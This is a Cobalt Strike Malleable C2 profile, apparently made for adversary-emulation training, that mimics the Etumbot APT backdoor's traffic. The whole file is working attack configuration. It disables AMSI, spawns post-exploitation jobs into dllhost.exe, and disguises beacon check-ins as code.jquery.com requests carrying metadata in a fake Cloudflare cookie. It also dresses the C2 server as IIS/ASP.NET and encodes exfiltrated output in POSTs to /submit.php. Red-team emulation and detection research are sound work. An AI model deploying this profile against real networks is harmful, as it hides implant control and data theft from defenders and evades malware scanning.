#
# Etumbot Profile
#   http://www.arbornetworks.com/asert/2014/06/illuminating-the-etumbot-apt-backdoor/
#
# Author: @harmj0y
#
set sample_name "crto";

set sleeptime "1000";
set jitter    "0";
set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";


post-ex {
    set amsi_disable "true";

    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}

dns-beacon {
    set maxdns    "255";
}



http-get {

    set uri "/pixel";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8";
        header "Referer" "http://www.google.com";
        header "Host" "code.jquery.com";
        header "Pragma" "no-cache";
        header "Cache-Control" "no-cache";
        header "Connection" "Keep-Alive";

        metadata {
           base64url;
           prepend "__cfduid=";
           header "Cookie";
        }   
    }

    server {

        header "Content-Type" "application/javascript; charset=utf-8";
        header "Server" "Microsoft-IIS/6.0";
        header "X-Powered-By" "ASP.NET";

        output {
            base64;
            print;
        }
    }
}

http-post {
    set uri "/submit.php";

    client {

        header "Content-Type" "application/octet-stream";
        header "Referer" "http://www.google.com";
        header "Pragma" "no-cache";
        header "Cache-Control" "no-cache";
        header "Connection" "Keep-Alive";
        header "Accept-Encoding" "gzip, deflate";


        id {
             mask;       
            base64url;
            parameter "id"; 
        }

        output {
            base64;
            print;
        }
    }

    server {

        header "Content-Type" "application/javascript; charset=utf-8";
        header "Server" "Microsoft-IIS/6.0";
        header "X-Powered-By" "ASP.NET";
        header "Connection" "keep-alive";
        header "Pragma" "no-cache";
        header "Cache-Control" "no-cache";

        output {
            base64;
            print;
        }
    }
}
